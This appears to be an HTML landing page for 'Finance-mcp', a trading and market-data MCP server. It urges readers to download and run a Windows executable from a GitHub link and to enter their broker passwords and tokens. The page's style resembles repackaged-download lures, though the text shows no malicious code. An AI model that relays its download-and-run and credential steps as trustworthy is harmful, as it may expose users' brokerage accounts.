<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Finance-mcp - Market Data, SEC Filings & Trading Tools</title>
  <meta name="description" content="Finance-mcp is an MCP server providing market data, SEC filings, macro and risk analysis tools compatible with Webull, Saxo, and Interactive Brokers. Features human-in-the-loop order execution.">
  <meta name="keywords" content="anthropic,claude,finance,human-in-the-loop,ibkr,interactive-brokers,market-data,mcp,model-context-protocol,python,saxo,sec-edgar,streamlit,trading,webull">
  <meta name="robots" content="index, follow">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background: #f4f7fc;
      color: #1e293b;
      line-height: 1.8;
    }
    .container {
      max-width: 1000px;
      margin: 0 auto;
      padding: 20px;
    }
    h1 {
      font-size: 2.4rem;
      margin: 30px 0 20px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      display: inline-block;
    }
    h2 {
      font-size: 1.8rem;
      color: #1e293b;
      margin: 40px 0 15px;
      border-bottom: 3px solid #667eea;
      padding-bottom: 8px;
    }
    h3 {
      font-size: 1.3rem;
      color: #334155;
      margin: 25px 0 10px;
    }
    p, li {
      font-size: 1.1rem;
      margin: 12px 0;
    }
    .badge {
      display: inline-block;
      background: #ff7f50;
      color: white;
      padding: 14px 30px;
      border-radius: 30px;
      font-size: 1.4rem;
      font-weight: bold;
      text-decoration: none;
      box-shadow: 0 4px 15px rgba(255, 127, 80, 0.4);
      transition: transform 0.3s;
      margin: 20px 0;
    }
    .badge:hover {
      transform: scale(1.05);
    }
    .badge2 {
      background: #4ecdc4;
      box-shadow: 0 4px 15px rgba(78, 205, 196, 0.4);
    }
    ul, ol {
      padding-left: 30px;
      margin: 15px 0;
    }
    .feature-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 20px;
      margin: 30px 0;
    }
    .feature-card {
      background: white;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .feature-card h3 {
      margin-top: 0;
    }
    .step-number {
      background: #667eea;
      color: white;
      border-radius: 50%;
      width: 35px;
      height: 35px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      margin-right: 8px;
    }
    code {
      background: #e8e8e8;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 0.95rem;
    }
    .note {
      background: #fff3cd;
      border-left: 6px solid #ffc107;
      padding: 15px;
      border-radius: 6px;
      margin: 20px 0;
    }
    hr {
      border: none;
      border-top: 2px dashed #d0d5dd;
      margin: 40px 0;
    }
    @media (max-width: 600px) {
      h1 { font-size: 1.8rem; }
      .container { padding: 15px; }
    }
  </style>
</head>
<body>
<div class="container">

  <a href="https://github.com/Eschatological-cpi959/Finance-mcp" class="badge" target="_blank">⬇️ Download Finance-mcp</a>

  <h1>📈 Finance-mcp – Market Data & Trading at Your Fingertips</h1>
  <p><strong>Finance-mcp</strong> is a powerful yet easy-to-use application that connects you to real-time market data, U.S. SEC filings (via EDGAR), macroeconomic indicators, and risk analysis tools – all through your broker: <strong>Webull, Saxo Bank, or Interactive Brokers (IBKR)</strong>. It also includes order execution behind a human approval step that the assistant cannot reach, ensuring your trades stay under your control. With <strong>41 tools</strong> available (filtered to what your specific broker supports), Finance-mcp is a complete financial cockpit for any trader or investor.</p>

  <hr>

  <h2>🔍 Key Features</h2>
  <div class="feature-grid">
    <div class="feature-card">
      <h3>📈 Real-Time & Historical Data</h3>
      <p>Access stock, ETF, and option prices from your broker’s feed.</p>
    </div>
    <div class="feature-card">
      <h3>📄 SEC Filings & Macro</h3>
      <p>Fetch 10-K, 10-Q, 8-K reports plus GDP, CPI, employment data.</p>
    </div>
    <div class="feature-card">
      <h3>⚙️ Risk Management Tools</h3>
      <p>Calculate portfolio risk, value-at-risk (VaR), and stress tests.</p>
    </div>
    <div class="feature-card">
      <h3>🔒 Human-in-the-Loop Trading</h3>
      <p>Orders require your approval; the assistant cannot execute trades alone.</p>
    </div>
  </div>

  <h2>🚀 Getting Started</h2>
  <p>To install and run Finance-mcp, follow these steps:</p>
  <ol>
    <li><span class="step-number">1</span> <strong>Visit the download page</strong> by clicking the <a href="https://github.com/Eschatological-cpi959/Finance-mcp" target="_blank">download button</a> at the top of this page. Visit this link to download the application.<br> The page will show the latest release files.</li>
    <li><span class="step-number">2</span> <strong>Locate the correct file</strong> on the page – it will be named something like <code>Finance-mcp-windows-x64.zip</code>. Download it to your computer.</li>
    <li><span class="step-number">3</span> Once downloaded, <strong>extract the ZIP file</strong> (right‑click → “Extract All”). Inside the folder, you will see an executable file <code>Finance-mcp.exe</code>.</li>
    <li><span class="step-number">4</span> <strong>Run the application</strong> by double‑clicking <code>Finance-mcp.exe</code>. A terminal window will open – that’s normal. The application also runs a web interface at <code>http://localhost:8501</code> (Streamlit). Wait until you see a message like “You can now view your Streamlit app.”</li>
    <li><span class="step-number">5</span> Open your web browser (Chrome, Edge, etc.) and go to <code>http://localhost:8501</code>. You will see the main dashboard where you can select your broker, connect accounts, and start using the 41 tools.</li>
  </ol>

  <h2>🔐 Connecting to Your Broker</h2>
  <p>After opening the app, click <strong>“Connect Broker”</strong> on the dashboard. You will see options for:</p>
  <ul>
    <li><strong>Webull</strong> – enter your Webull username/password (encrypted locally).</li>
    <li><strong>Saxo Bank</strong> – provide your Saxo API token (generate from your Saxo portal).</li>
    <li><strong>Interactive Brokers (IBKR)</strong> – for users of IBKR TWS or Gateway, you will need the IB API configured (typically port 7496/7497). The app guides you step-by-step.</li>
  </ul>
  <p>Once connected, the app filters the 41 tools to those your broker supports – for example, IBKR gives you market data, SEC filings, and trading; Webull focuses on data and analytics. The human approval step for order execution is built in: when you tell the assistant to trade, the system will show a request you must confirm via the app interface or a prompted window.</p>

  <h2>📖 Using the Tools</h2>
  <p>After connecting, you will see a menu of tools. Each tool has a description and example input fields. Common tools include:</p>
  <ul>
    <li><strong>🔎 Stock Quote</strong> – get current price, volume, change.</li>
    <li><strong>📋 SEC Filing Viewer</strong> – search by company ticker and date range.</li>
    <li><strong>📊 Economic Calendars</strong> – view upcoming reports.</li>
    <li><strong>⚡ Risk Analysis</strong> – input a portfolio… and the app calculates VaR, Sharpe ratio, and more.</li>
    <li><strong>📈 Charting</strong> – interactive charts with moving averages.</li>
  </ul>
  <p>All tools run inside the same Streamlet interface—no terminal required after setup.</p>

  <h2>🔧 Troubleshooting</h2>
  <ul>
    <li><strong>App won't start?</strong> Make sure you extracted the ZIP file completely. Run from a regular user account (not admin).</li>
    <li><strong>Web page not loading?</strong> Check that the command window didn’t close – it runs in the background. If you close it, the app stops.</li>
    <li><strong>Broker connection fails?</strong> Double‑check your credentials and API tokens. For IBKR, TWS API must be enabled in TWS settings.</li>
    <li><strong>Other issues?</strong> The GitHub repo has a “Issues” tab where you can ask for support.</li>
  </ul>

  <div class="note">
    <strong>👤 No programming knowledge needed!</strong> Everything runs through the web interface you open in your browser. You don’t need to write any code.
  </div>

  <h2>📥 Download Again</h2>
  <p>If you need to download again or try a different version, click the button below:</p>
  <p><a href="https://github.com/Eschatological-cpi959/Finance-mcp" class="badge badge2" target="_blank">⬇️ Download from GitHub</a></p>
  <p><small>Download includes all 41 tools and broker support. No installation besides extraction.</small></p>

  <h2>🛠️ Technical Details (Optional)</h2>
  <p>Finance-mcp is built as a <strong>Model Context Protocol (MCP) server</strong> that is compatible with <strong>Anthropic Claude</strong> and other AI assistants. It uses Python, Streamlit for the web UI, and brokers for Webull, Saxo, and IBKR. The “human‑in‑the‑loop” step is enforced so that only you can approve order execution. All data stays local; no cloud is stored.</p>

  <h2>📚 Keywords</h2>
  <p>anthropic, claude, finance, human-in-the-loop, ibkr, interactive-brokers, market-data, mcp, model-context-protocol, python, saxo, sec-edgar, streamlit, trading, webull</p>

  <hr>
  <p style="text-align:center;color:#64748b;"><small>Finance-mcp – version 1.0.0</small></p>

</div>
</body>
</html>